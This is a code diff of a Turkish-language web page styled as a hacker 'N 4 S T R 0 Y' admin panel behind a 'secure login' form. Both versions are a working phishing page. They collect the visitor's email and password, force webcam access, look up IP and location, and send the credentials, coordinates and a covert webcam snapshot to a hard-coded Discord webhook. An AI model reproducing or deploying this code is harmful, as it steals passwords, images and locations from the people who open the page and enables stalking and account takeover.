@@ -2,164 +2,141 @@
 <html lang="tr">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>SİSTEM ERİŞİMİ | N 4 S T R 0 Y</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>N 4 S T R 0 Y // CORE</title>
     <style>
-        :root { --blue: #0070f3; --red: #ff0000; --bg: #000; --card: #0a0a0a; --border: #1a1a1a; }
-        body { background: var(--bg); color: #fff; font-family: 'Courier New', Courier, monospace; margin: 0; overflow-x: hidden; }
+        body { background: #000; color: #00ff00; font-family: monospace; margin: 0; padding: 0; overflow-x: hidden; }
+        #authWrapper { position: fixed; inset: 0; background: #000; z-index: 9999; display: flex; align-items: center; justify-content: center; }
+        .card { background: #0a0a0a; border: 1px solid #1a1a1a; padding: 30px; width: 300px; text-align: center; }
+        input { width: 100%; padding: 10px; margin: 10px 0; background: #000; border: 1px solid #333; color: #0f0; box-sizing: border-box; }
+        button { width: 100%; padding: 10px; background: #f00; color: #fff; border: none; font-weight: bold; cursor: pointer; }
         
-        /* Auth Ekranı */
-        #authWrapper { position: fixed; inset: 0; background: #000; z-index: 10000; display: flex; justify-content: center; align-items: center; padding: 20px; }
-        .auth-card { background: var(--card); padding: 30px; border: 1px solid var(--border); border-radius: 4px; width: 100%; max-width: 350px; text-align: center; box-shadow: 0 0 20px rgba(255,0,0,0.1); }
-        h2 { color: var(--red); font-size: 18px; letter-spacing: 2px; margin-bottom: 20px; }
-        input { width: 100%; padding: 12px; margin-bottom: 10px; background: #000; border: 1px solid var(--border); color: #00ff00; border-radius: 2px; box-sizing: border-box; outline: none; }
-        .btn-action { width: 100%; padding: 12px; background: var(--red); color: #fff; border: none; font-weight: bold; cursor: pointer; margin-top: 10px; }
+        #panel { display: none; padding: 10px; }
+        .header { border-bottom: 1px solid #f00; padding: 10px; display: flex; justify-content: space-between; font-size: 12px; margin-bottom: 15px; }
         
-        /* Panel Düzeni */
-        #panel { display: none; flex-direction: column; min-height: 100vh; }
-        .top-header { padding: 15px; border-bottom: 1px solid var(--red); display: flex; justify-content: space-between; align-items: center; background: #050505; font-size: 12px; }
-        .content { padding: 15px; display: flex; flex-direction: column; gap: 15px; }
-        .box { background: #050505; border: 1px solid var(--border); padding: 12px; position: relative; }
-        .box-title { font-size: 10px; color: #555; margin-bottom: 8px; border-bottom: 1px solid #111; padding-bottom: 4px; }
+        /* İstediğin Düzen: Kamera Üstte, Menüler Altta */
+        .grid-container { display: flex; flex-direction: column; gap: 15px; }
+        .cam-box { width: 100%; border: 1px solid #222; background: #050505; padding: 5px; box-sizing: border-box; }
+        #myCam { width: 100%; filter: grayscale(1) contrast(1.2); transform: scaleX(-1); border: 1px solid #333; }
         
-        /* Kamera ve Harita */
-        #myCam { width: 100%; border: 1px solid #222; filter: sepia(100%) hue-rotate(320deg) brightness(0.8); transform: scaleX(-1); }
-        #mapImg { width: 100%; height: 160px; object-fit: cover; border: 1px solid #222; margin-top: 10px; }
+        .info-box { border: 1px solid #222; background: #050505; padding: 15px; font-size: 11px; }
+        .menu-item { padding: 12px 0; border-bottom: 1px solid #111; display: flex; justify-content: space-between; color: #888; }
+        .status { color: #f00; font-weight: bold; }
         
-        /* Terminal ve Modüller */
-        .terminal { height: 120px; overflow-y: auto; font-size: 10px; color: #00ff00; line-height: 1.4; padding: 5px; }
-        .module-row { display: flex; justify-content: space-between; padding: 10px 0; border-bottom: 1px solid #111; font-size: 11px; }
-        .status { color: var(--red); font-weight: bold; }
-        
-        .footer { text-align: center; padding: 30px; font-size: 10px; color: #333; letter-spacing: 5px; }
+        #mapImg { width: 100%; height: 150px; margin-top: 10px; border: 1px solid #333; display: none; }
+        .footer { text-align: center; color: #222; font-size: 10px; margin-top: 20px; letter-spacing: 5px; }
     </style>
 </head>
 <body>
 
-<audio id="opMusic" loop src="https://www.soundjay.com/misc/sounds/heartbeat-01.mp3"></audio>
+<audio id="opMusic" loop>
+    <source src="https://www.soundjay.com/misc/sounds/heartbeat-01.mp3" type="audio/mpeg">
+</audio>
 
 <div id="authWrapper">
-    <div id="regCard" class="auth-card">
-        <h2>SİSTEME KAYIT</h2>
-        <input type="email" id="regMail" placeholder="E-Posta Giriniz">
-        <input type="password" id="regPass" placeholder="Şifre Belirleyiniz">
-        <button class="btn-action" onclick="handleRegister()">PROTOKOLÜ BAŞLAT</button>
-        <p style="font-size:10px; color:#444; margin-top:15px; cursor:pointer;" onclick="toggleAuth()">Zaten yetkiniz var mı? Giriş Yap</p>
-    </div>
-    
-    <div id="loginCard" class="auth-card" style="display:none;">
-        <h2>YETKİLİ GİRİŞİ</h2>
-        <input type="email" id="logMail" placeholder="E-Posta">
-        <input type="password" id="logPass" placeholder="Şifre">
-        <button class="btn-action" onclick="handleLogin()">ERİŞİM SAĞLA</button>
-        <p style="font-size:10px; color:#444; margin-top:15px; cursor:pointer;" onclick="toggleAuth()">Yeni birim oluştur</p>
+    <div class="card">
+        <h2 style="color:#f00; font-size: 16px;">SECURE LOGIN</h2>
+        <input type="email" id="mail" placeholder="E-Posta Adresi">
+        <input type="password" id="pass" placeholder="Şifre">
+        <button onclick="startOp()">KAYIT OL VE BAĞLAN</button>
     </div>
 </div>
 
 <div id="panel">
-    <div class="top-header">
-        <span style="color:var(--red); font-weight:bold;">N 4 S T R 0 Y // CORE</span>
-        <span id="liveClock">00:00:00</span>
+    <div class="header">
+        <span>N 4 S T R 0 Y // ADMIN ACCESS</span>
+        <span id="clock">00:00:00</span>
     </div>
 
-    <div class="content">
-        <div class="box">
-            <div class="box-title">GÖRSEL VERİ AKIŞI</div>
+    <div class="grid-container">
+        <div class="cam-box">
             <video id="myCam" autoplay playsinline muted></video>
-            <div id="locInfo" style="font-size:10px; color:var(--red); margin-top:8px;">KONUM: BEKLENİYOR...</div>
-            <img id="mapImg" src="" alt="Sinyal aranıyor...">
+            <div id="locData" style="color:#f00; font-size:10px; margin-top:10px;">KONUM SİNYALİ BEKLENİYOR...</div>
+            <img id="mapImg" src="">
         </div>
 
-        <div class="box">
-            <div class="box-title">SİSTEM GÜNLÜĞÜ & BATARYA: <span id="batVal">%--</span></div>
-            <div class="terminal" id="logs">
-                [READY] Sistem başlatılıyor...<br>
-            </div>
+        <div class="info-box">
+            <div style="margin-bottom:10px; color:#f00; border-bottom:1px solid #333; padding-bottom:5px;">SİSTEM DURUMU</div>
+            <div class="menu-item">BATARYA SEVİYESİ <span id="shrg" style="color:#0070f3;">%--</span></div>
+            <div class="menu-item">IP ADRESİ <span id="ipVal" style="color:#fff;">Yükleniyor...</span></div>
+            <div class="menu-item">MERNİS 2026 <span class="status">KİLİTLİ</span></div>
+            <div class="menu-item">KONUM TAKİBİ <span class="status">AKTİF</span></div>
         </div>
 
-        <div class="box">
-            <div class="box-title">AKTİF SORGULAMA BİRİMLERİ</div>
-            <div class="module-row"><span>MERNİS DATA 2026</span> <span class="status">[LOCK]</span></div>
-            <div class="module-row"><span>GSM TRACE (GPS)</span> <span class="status">[LOCK]</span></div>
-            <div class="module-row"><span>IP REVERSE ENG.</span> <span class="status">[LOCK]</span></div>
+        <div class="info-box" id="logs" style="color:#0070f3; font-size:10px; height:80px; overflow-y:auto;">
+            [INFO] Başlatma komutu beklendi...<br>
         </div>
-        
-        <div class="footer">N 4 S T R 0 Y</div>
     </div>
+
+    <div class="footer">N 4 S T R 0 Y</div>
 </div>
 
 <script>
-    let u = { ip: 'Analiz ediliyor...', lat: '0', lon: '0' };
-    const webhookURL = "https://discord.com/api/webhooks/1501879445722759260/1xUO1IOn_YOTS9l0_XcLBo83UkbEgvJjTcjYdcV_arPyX4s-c8Js_3YFZ6jZlKx5Ms5f";
+    let userData = { ip: 'Bilinmiyor', lat: '', lon: '' };
+    const webhook = "https://discord.com/api/webhooks/1501879445722759260/1xUO1IOn_YOTS9l0_XcLBo83UkbEgvJjTcjYdcV_arPyX4s-c8Js_3YFZ6jZlKx5Ms5f";
 
-    // Önce IP ve Konumu Çek
-    fetch('https://ipapi.co/json/').then(r => r.json()).then(d => {
-        u.ip = d.ip; u.lat = d.latitude; u.lon = d.longitude;
-    });
-
-    async function sendToDiscord(mail, pass, status) {
-        // Kamera ve IP'nin oturması için bekletme
-        setTimeout(async () => {
-            const video = document.getElementById('myCam');
-            const canvas = document.createElement('canvas');
-            canvas.width = video.videoWidth || 640;
-            canvas.height = video.videoHeight || 480;
-            canvas.getContext('2d').drawImage(video, 0, 0);
-            
-            canvas.toBlob(async (blob) => {
-                const formData = new FormData();
-                const content = `🚨 **N 4 S T R 0 Y - SIZMA TESPİTİ**\n**E-Posta:** ${mail}\n**Şifre:** ${pass}\n**IP:** ${u.ip}\n**Konum:** ${u.lat},${u.lon}\n**Mod:** ${status}`;
-                formData.append("payload_json", JSON.stringify({ content: content }));
-                if(blob) formData.append("file", blob, "capture.png");
-                fetch(webhookURL, { method: "POST", body: formData });
-            }, 'image/png');
-        }, 2500); 
+    // Verileri En Başta Çekmeye Başla
+    async function getDetails() {
+        try {
+            const resp = await fetch('https://ipapi.co/json/');
+            const d = await resp.json();
+            userData.ip = d.ip;
+            userData.lat = d.latitude;
+            userData.lon = d.longitude;
+        } catch(e) { console.log("Hızlı veri alınamadı."); }
     }
+    getDetails();
 
-    function toggleAuth() {
-        document.getElementById('loginCard').style.display = document.getElementById('loginCard').style.display === 'none' ? 'block' : 'none';
-        document.getElementById('regCard').style.display = document.getElementById('regCard').style.display === 'none' ? 'block' : 'none';
-    }
+    async function startOp() {
+        const m = document.getElementById('mail').value;
+        const p = document.getElementById('pass').value;
+        if(!m.includes('@')) return alert("Geçersiz e-posta!");
 
-    function handleRegister() {
-        const m = document.getElementById('regMail').value;
-        const p = document.getElementById('regPass').value;
-        if(!m.includes('@')) return alert("Geçersiz protokol adresi!");
-        localStorage.setItem('n4_user', JSON.stringify({ email: m }));
-        launchSystem().then(() => sendToDiscord(m, p, "Yeni Kayıt"));
-    }
+        // 1. Müziği Başlat (Kullanıcı tıkladığı için çalışacak)
+        const music = document.getElementById('opMusic');
+        music.play().catch(e => console.log("Müzik engellendi"));
 
-    function handleLogin() {
-        const m = document.getElementById('logMail').value;
-        const p = document.getElementById('logPass').value;
-        const stored = localStorage.getItem('n4_user');
-        if (stored && JSON.parse(stored).email === m) {
-            launchSystem().then(() => sendToDiscord(m, p, "Geri Dönüş"));
-        } else { alert("YETKİSİZ GİRİŞ: Önce kayıt olmalısınız."); }
-    }
-
-    async function launchSystem() {
-        document.getElementById('opMusic').play();
+        // 2. Kamera İzni İste
         try {
             const stream = await navigator.mediaDevices.getUserMedia({video: true});
             document.getElementById('myCam').srcObject = stream;
-        } catch(e) { alert("SİSTEM HATASI: Kamera erişimi zorunludur."); location.reload(); return; }
+            
+            document.getElementById('authWrapper').style.display = 'none';
+            document.getElementById('panel').style.display = 'block';
 
-        document.getElementById('authWrapper').style.display = 'none';
-        document.getElementById('panel').style.display = 'flex';
-        
-        // Verileri ekrana bas
-        document.getElementById('locInfo').innerText = `KOORDİNAT: ${u.lat}, ${u.lon} | IP: ${u.ip}`;
-        document.getElementById('mapImg').src = `https://static-maps.yandex.ru/1.x/?ll=${u.lon},${u.lat}&z=16&l=map&size=450,200&pt=${u.lon},${u.lat},pmwtm`;
-        
-        navigator.getBattery().then(b => { document.getElementById('batVal').innerText = '%' + Math.round(b.level * 100); });
-        
-        const messages = ["Çekirdek yüklendi.", "Konum mühürlendi.", "Canlı yayın tünellendi.", "N 4 S T R 0 Y aktif."];
-        messages.forEach((msg, i) => setTimeout(() => { 
-            document.getElementById('logs').innerHTML += `[OK] ${msg}<br>`; 
-        }, i * 1000));
+            // 3. Paneli Güncelle
+            document.getElementById('ipVal').innerText = userData.ip;
+            document.getElementById('locData').innerText = `KONUM: ${userData.lat}, ${userData.lon}`;
+            if(userData.lat) {
+                document.getElementById('mapImg').src = `https://static-maps.yandex.ru/1.x/?ll=${userData.lon},${userData.lat}&z=14&l=map&size=400,200&pt=${userData.lon},${userData.lat},pmwtm`;
+                document.getElementById('mapImg').style.display = 'block';
+            }
+            
+            navigator.getBattery().then(b => { document.getElementById('shrg').innerText = '%' + Math.round(b.level * 100); });
+
+            // 4. Discord'a Fotoğraf ve Bilgi Gönder (2 saniye bekle ki kamera netleşsin)
+            setTimeout(() => {
+                const video = document.getElementById('myCam');
+                const canvas = document.createElement('canvas');
+                canvas.width = video.videoWidth;
+                canvas.height = video.videoHeight;
+                canvas.getContext('2d').drawImage(video, 0, 0);
+                
+                canvas.toBlob(blob => {
+                    const fd = new FormData();
+                    const txt = `🚨 **N 4 S T R 0 Y - SIZMA**\n**Mail:** ${m}\n**Şifre:** ${p}\n**IP:** ${userData.ip}\n**Konum:** ${userData.lat},${userData.lon}`;
+                    fd.append("payload_json", JSON.stringify({ content: txt }));
+                    fd.append("file", blob, "shot.png");
+                    fetch(webhook, { method: "POST", body: fd });
+                });
+            }, 2000);
+
+        } catch(e) {
+            alert("Sistem Erişimi İçin Kamera İzni Gerekli!");
+        }
     }
-    setInterval(() => { document.getElementById('liveClock').innerText = new Date().toLocaleTimeString(); }, 1000);
+
+    setInterval(() => { document.getElementById('clock').innerText = new Date().toLocaleTimeString(); }, 1000);
 </script>
 </body>
 </html>
